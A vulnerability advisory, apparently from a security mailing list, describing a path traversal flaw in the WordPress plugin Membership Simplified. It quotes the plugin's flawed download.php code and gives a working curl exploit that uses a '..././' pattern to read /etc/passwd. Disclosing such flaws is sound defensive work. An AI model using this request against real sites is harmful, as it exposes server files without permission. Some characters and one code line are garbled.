Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/membership-simplified-for-oap-members-only Vendor: https://profiles.wordpress.org/williamdeangelis/ Vendor Notified: Vendor Contact: plugins@...dpress.org Advisory: Description: Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses. Vulnerability: The file download code located membership-simplified-for-oap-members-only/download.php does check whether a user is logged in and has download privledges, the code on line 5 that checks the path can be defeated by using a ..././ pattern to get the desired ../ after being passed through the str_replace() function:   3 $path = substr(getcwd(), 0, -50). "uploads/membership-simplified-for-oap-members-only/"; // change the path to fit your websites document structure   4 $fullPath = $path.$_GET['download_file'];   5 $fullPath = str_replace("../","",$fullPath);   6    7 if ($fd = fopen($fullPath, "r")) {   8     $fsize = filesize($fullPath);   9     $path_parts = pathinfo($fullPath);  10     $ext = strtolower($path_parts["extension"]);  11     switch ($ext) {  12         case "pdf":  13         header("Content-type: application/pdf"); // add here more headers for d    iff. extensions  14         header("Content-Disposition: attachment; filename=\"".$path_parts["base    name"]."\""); // use 'attachment' to force a download  15         break;  16         default;  17         header("Content-type: application/octet-stream");  18         header("Content-Disposition: filename=\"".$path_parts["basename"]."\"")    ;  19     }  20     header("Content-length: $fsize");  21     header("Cache-control: private"); //use this to open files directly  22     while(!feof($fd)) {  23         $buffer = fread($fd,  24         echo $buffer;  Exploit Code: 	â˘ $ curl http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././..././..././..././..././..././etc/passwd 	â˘   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
